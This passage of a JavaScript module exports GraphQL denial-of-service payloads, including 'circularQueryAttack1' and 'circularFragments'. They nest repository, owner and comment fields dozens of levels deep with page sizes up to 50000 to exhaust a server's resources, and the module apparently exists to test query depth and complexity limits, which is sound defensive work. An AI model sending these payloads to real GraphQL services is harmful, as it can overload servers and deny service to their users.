                                                                                                    }
                                                                                                  }
                                                                                                  owner {
                                                                                                    id
                                                                                                    login
                                                                                                    name
                                                                                                    repositories(first: 5000) {
                                                                                                      nodes {
                                                                                                        id
                                                                                                        name
                                                                                                        description
                                                                                                        comments(first: 5000) {  # Adding comments field
                                                                                                          edges {
                                                                                                            node {
                                                                                                              id
                                                                                                              content
                                                                                                              user {
                                                                                                                id
                                                                                                                login
                                                                                                                name
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                        owner {
                                                                                                          id
                                                                                                          login
                                                                                                          name
                                                                                                          repositories(first: 5000) {
                                                                                                            nodes {
                                                                                                              id
                                                                                                              name
                                                                                                              description
                                                                                                              comments(first: 5000) {  # Adding comments field
                                                                                                                edges {
                                                                                                                  node {
                                                                                                                    id
                                                                                                                    content
                                                                                                                    user {
                                                                                                                      id
                                                                                                                      login
                                                                                                                      name
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                              owner {
                                                                                                                id
                                                                                                                login
                                                                                                                name
                                                                                                                repositories(first: 5000) {
                                                                                                                  nodes {
                                                                                                                    id
                                                                                                                    name
                                                                                                                    description
                                                                                                                    comments(first: 5000) {  # Adding comments field
                                                                                                                      edges {
                                                                                                                        node {
                                                                                                                          id
                                                                                                                          content
                                                                                                                          user {
                                                                                                                            id
                                                                                                                            login
                                                                                                                            name
                                                                                                                          }
                                                                                                                        }
                                                                                                                      }
                                                                                                                    }
                                                                                                                    owner {
                                                                                                                      id
                                                                                                                      login
                                                                                                                      name
                                                                                                                      repositories(first: 5000) {
                                                                                                                        nodes {
                                                                                                                          id
                                                                                                                          name
                                                                                                                          description
                                                                                                                          comments(first: 5000) {  # Adding comments field
                                                                                                                            edges {
                                                                                                                              node {
                                                                                                                                id
                                                                                                                                content
                                                                                                                                user {
                                                                                                                                  id
                                                                                                                                  login
                                                                                                                                  name
                                                                                                                                }
                                                                                                                              }
                                                                                                                            }
                                                                                                                          }
                                                                                                                          owner {
                                                                                                                            id
                                                                                                                            login
                                                                                                                            name
                                                                                                                          }
                                                                                                                        }
                                                                                                                      }
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
`
,
circularQueryAttack1: gql`
query {
  user(login: "someUser") {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        id
        name
        description
        comments(first: 500) {
          edges {
            node {
              id
              content
              user {
                id
                login
                name
              }
            }
          }
        }
        owner {
          id
          login
          name
          repositories(first: 5000) {
            nodes {
              id
              name
              description
              comments(first: 500) {
                edges {
                  node {
                    id
                    content
                    user {
                      id
                      login
                      name
                    }
                  }
                }
              }
              owner {
                id
                login
                name
                repositories(first: 5000) {
                  nodes {
                    id
                    name
                    description
                    comments(first: 500) {
                      edges {
                        node {
                          id
                          content
                          user {
                            id
                            login
                            name
                          }
                        }
                      }
                    }
                    owner {
                      id
                      login
                      name
                      repositories(first: 5000) {
                        nodes {
                          id
                          name
                          description
                          comments(first: 500) {
                            edges {
                              node {
                                id
                                content
                                user {
                                  id
                                  login
                                  name
                                }
                              }
                            }
                          }
                          owner {
                            id
                            login
                            name
                            repositories(first: 5000) {
                              nodes {
                                id
                                name
                                description
                                comments(first: 500) {
                                  edges {
                                    node {
                                      id
                                      content
                                      user {
                                        id
                                        login
                                        name
                                      }
                                    }
                                  }
                                }
                                owner {
                                  id
                                  login
                                  name
                                  repositories(first: 5000) {
                                    nodes {
                                      id
                                      name
                                      description
                                      comments(first: 500) {
                                        edges {
                                          node {
                                            id
                                            content
                                            user {
                                              id
                                              login
                                              name
                                            }
                                          }
                                        }
                                      }
                                      owner {
                                        id
                                        login
                                        name
                                        repositories(first: 5000) {
                                          nodes {
                                            id
                                            name
                                            description
                                            comments(first: 500) {
                                              edges {
                                                node {
                                                  id
                                                  content
                                                  user {
                                                    id
                                                    login
                                                    name
                                                  }
                                                }
                                              }
                                            }
                                            owner {
                                              id
                                              login
                                              name
                                              repositories(first: 500) {
                                                nodes {
                                                  id
                                                  name
                                                  description
                                                  comments(first: 500) {
                                                    edges {
                                                      node {
                                                        id
                                                        content
                                                        user {
                                                          id
                                                          login
                                                          name
                                                        }
                                                      }
                                                    }
                                                  }
                                                  owner {
                                                    id
                                                    login
                                                    name
                                                    repositories(first: 5000) {
                                                      nodes {
                                                        id
                                                        name
                                                        description
                                                        comments(first: 500) {
                                                          edges {
                                                            node {
                                                              id
                                                              content
                                                              user {
                                                                id
                                                                login
                                                                name
                                                              }
                                                            }
                                                          }
                                                        }
                                                        owner {
                                                          id
                                                          login
                                                          name
                                                          repositories(first: 500) {
                                                            nodes {
                                                              id
                                                              name
                                                              description
                                                              comments(first: 500) {
                                                                edges {
                                                                  node {
                                                                    id
                                                                    content
                                                                    user {
                                                                      id
                                                                      login
                                                                      name
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                              owner {
                                                                id
                                                                login
                                                                name
                                                                repositories(first: 500) {
                                                                  nodes {
                                                                    id
                                                                    name
                                                                    description
                                                                    comments(first: 500) {
                                                                      edges {
                                                                        node {
                                                                          id
                                                                          content
                                                                          user {
                                                                            id
                                                                            login
                                                                            name
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                    owner {
                                                                      id
                                                                      login
                                                                      name
                                                                      repositories(first: 500) {
                                                                        nodes {
                                                                          id
                                                                          name
                                                                          description
                                                                          comments(first: 500) {
                                                                            edges {
                                                                              node {
                                                                                id
                                                                                content
                                                                                user {
                                                                                  id
                                                                                  login
                                                                                  name
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                          owner {
                                                                            id
                                                                            login
                                                                            name
                                                                            repositories(first: 500) {
                                                                              nodes {
                                                                                id
                                                                                name
                                                                                description
                                                                                comments(first: 500) {
                                                                                  edges {
                                                                                    node {
                                                                                      id
                                                                                      content
                                                                                      user {
                                                                                        id
                                                                                        login
                                                                                        name
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                                owner {
                                                                                  id
                                                                                  login
                                                                                  name
                                                                                  repositories(first: 500) {
                                                                                    nodes {
                                                                                      id
                                                                                      name
                                                                                      description
                                                                                      comments(first: 500) {
                                                                                        edges {
                                                                                          node {
                                                                                            id
                                                                                            content
                                                                                            user {
                                                                                              id
                                                                                              login
                                                                                              name
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                      owner {
                                                                                        id
                                                                                        login
                                                                                        name
                                                                                        repositories(first: 500) {
                                                                                          nodes {
                                                                                            id
                                                                                            name
                                                                                            description
                                                                                            comments(first: 500) {
                                                                                              edges {
                                                                                                node {
                                                                                                  id
                                                                                                  content
                                                                                                  user {
                                                                                                    id
                                                                                                    login
                                                                                                    name
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                            owner {
                                                                                              id
                                                                                              login
                                                                                              name
                                                                                              repositories(first: 500) {
                                                                                                nodes {
                                                                                                  id
                                                                                                  name
                                                                                                  description
                                                                                                  comments(first: 500) {
                                                                                                    edges {
                                                                                                      node {
                                                                                                        id
                                                                                                        content
                                                                                                        user {
                                                                                                          id
                                                                                                          login
                                                                                                          name
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                  owner {
                                                                                                    id
                                                                                                    login
                                                                                                    name
                                                                                                    repositories(first: 500) {
                                                                                                      nodes {
                                                                                                        id
                                                                                                        name
                                                                                                        description
                                                                                                        comments(first: 500) {
                                                                                                          edges {
                                                                                                            node {
                                                                                                              id
                                                                                                              content
                                                                                                              user {
                                                                                                                id
                                                                                                                login
                                                                                                                name
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                        owner {
                                                                                                          id
                                                                                                          login
                                                                                                          name
                                                                                                          repositories(first: 500) {
                                                                                                            nodes {
                                                                                                              id
                                                                                                              name
                                                                                                              description
                                                                                                              comments(first: 500) {
                                                                                                                edges {
                                                                                                                  node {
                                                                                                                    id
                                                                                                                    content
                                                                                                                    user {
                                                                                                                      id
                                                                                                                      login
                                                                                                                      name
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                              owner {
                                                                                                                id
                                                                                                                login
                                                                                                                name
                                                                                                                repositories(first: 500) {
                                                                                                                  nodes {
                                                                                                                    id
                                                                                                                    name
                                                                                                                    description
                                                                                                                    comments(first: 500) {
                                                                                                                      edges {
                                                                                                                        node {
                                                                                                                          id
                                                                                                                          content
                                                                                                                          user {
                                                                                                                            id
                                                                                                                            login
                                                                                                                            name
                                                                                                                          }
                                                                                                                        }
                                                                                                                      }
                                                                                                                    }
                                                                                                                    owner {
                                                                                                                      id
                                                                                                                      login
                                                                                                                      name
                                                                                                                      repositories(first: 500) {
                                                                                                                        nodes {
                                                                                                                          id
                                                                                                                          name
                                                                                                                          description
                                                                                                                          comments(first: 500) {
                                                                                                                            edges {
                                                                                                                              node {
                                                                                                                                id
                                                                                                                                content
                                                                                                                                user {
                                                                                                                                  id
                                                                                                                                  login
                                                                                                                                  name
                                                                                                                                }
                                                                                                                              }
                                                                                                                            }
                                                                                                                          }
                                                                                                                          owner {
                                                                                                                            id
                                                                                                                            login
                                                                                                                            name
                                                                                                                          }
                                                                                                                        }
                                                                                                                      }
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
`

,

circularFragments: gql`
query {
  user(login: "someUser") {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  login
  name
  repositories(first: 50000) {
    nodes {
      ...RepositoryFieldsLevel1
    }
  }
}

fragment RepositoryFieldsLevel1 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel2
      }
    }
  }
}

fragment RepositoryFieldsLevel2 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel3
      }
    }
  }
}

fragment RepositoryFieldsLevel3 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel4
      }
    }
  }
}

fragment RepositoryFieldsLevel4 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel5
      }
    }
  }
}

fragment RepositoryFieldsLevel5 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel6
      }
    }
  }
}

fragment RepositoryFieldsLevel6 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel7
      }
    }
  }
}

fragment RepositoryFieldsLevel7 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel8
      }
    }
  }
}

fragment RepositoryFieldsLevel8 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel9
      }
    }
  }
}

fragment RepositoryFieldsLevel9 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel10
      }
    }
  }
}

fragment RepositoryFieldsLevel10 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel11
      }
    }
  }
}

fragment RepositoryFieldsLevel11 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel12
      }
    }
  }
}

fragment RepositoryFieldsLevel12 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel13
      }
    }
  }
}

fragment RepositoryFieldsLevel13 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel14
      }
    }
  }
}

fragment RepositoryFieldsLevel14 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel15
      }
    }
  }
}

fragment RepositoryFieldsLevel15 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel16
      }
    }
  }
}

fragment RepositoryFieldsLevel16 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel17
      }
    }
  }
}

fragment RepositoryFieldsLevel17 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel18
      }
    }
  }
}

fragment RepositoryFieldsLevel18 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel19
      }
    }
  }
}

fragment RepositoryFieldsLevel19 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel20
      }
    }
  }
}

fragment RepositoryFieldsLevel20 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel21
      }
    }
  }
}

fragment RepositoryFieldsLevel21 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel22
      }
    }
  }
}

fragment RepositoryFieldsLevel22 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel23
      }
    }
  }
}

fragment RepositoryFieldsLevel23 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel24
      }
    }
  }
}

fragment RepositoryFieldsLevel24 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel25
      }
    }
  }
}

fragment RepositoryFieldsLevel25 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel26
      }
    }
  }
}

fragment RepositoryFieldsLevel26 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel27
      }
    }
  }
}

fragment RepositoryFieldsLevel27 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel28
      }
    }
  }
}

fragment RepositoryFieldsLevel28 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel29
      }
    }
  }
}

fragment RepositoryFieldsLevel29 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50000) {
      nodes {
        ...RepositoryFieldsLevel30
      }
    }
  }
}

fragment RepositoryFieldsLevel30 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
  }
}
`

/*circularFragments: gql`
query {
  user(login: "someUser") {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  login
  name
  repositories(first: 5000) {
    nodes {
      ...RepositoryFieldsLevel1
    }
  }
}

fragment RepositoryFieldsLevel1 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel2
      }
    }
  }
}

fragment RepositoryFieldsLevel2 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel3
      }
    }
  }
}

fragment RepositoryFieldsLevel3 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel4
      }
    }
  }
}

fragment RepositoryFieldsLevel4 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel5
      }
    }
  }
}

fragment RepositoryFieldsLevel5 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel6
      }
    }
  }
}

fragment RepositoryFieldsLevel6 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel7
      }
    }
  }
}

fragment RepositoryFieldsLevel7 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel8
      }
    }
  }
}

fragment RepositoryFieldsLevel8 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel9
      }
    }
  }
}

fragment RepositoryFieldsLevel9 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel10
      }
    }
  }
}

fragment RepositoryFieldsLevel10 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel11
      }
    }
  }
}

fragment RepositoryFieldsLevel11 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel12
      }
    }
  }
}

fragment RepositoryFieldsLevel12 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel13
      }
    }
  }
}

fragment RepositoryFieldsLevel13 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel14
      }
    }
  }
}

fragment RepositoryFieldsLevel14 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel15
      }
    }
  }
}

fragment RepositoryFieldsLevel15 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel16
      }
    }
  }
}

fragment RepositoryFieldsLevel16 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel17
      }
    }
  }
}

fragment RepositoryFieldsLevel17 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel18
      }
    }
  }
}

fragment RepositoryFieldsLevel18 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel19
      }
    }
  }
}

fragment RepositoryFieldsLevel19 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel20
      }
    }
  }
}

fragment RepositoryFieldsLevel20 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel21
      }
    }
  }
}

fragment RepositoryFieldsLevel21 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel22
      }
    }
  }
}

fragment RepositoryFieldsLevel22 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel23
      }
    }
  }
}

fragment RepositoryFieldsLevel23 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel24
      }
    }
  }
}

fragment RepositoryFieldsLevel24 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel25
      }
    }
  }
}

fragment RepositoryFieldsLevel25 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel26
      }
    }
  }
}

fragment RepositoryFieldsLevel26 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 500) {
      nodes {
        ...RepositoryFieldsLevel27
      }
    }
  }
}

fragment RepositoryFieldsLevel27 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel28
      }
    }
  }
}

fragment RepositoryFieldsLevel28 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel29
      }
    }
  }
}

fragment RepositoryFieldsLevel29 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        ...RepositoryFieldsLevel30
      }
    }
  }
}

fragment RepositoryFieldsLevel30 on Repository {
  id
  name
  description
  comments(first: 1000) {
    edges {
      node {
        id
        content
        user {
          id
          login
          name
        }
      }
    }
  }
  owner {
    id
    login
    name
  }
}
`
*/


};

module.exports = queries;
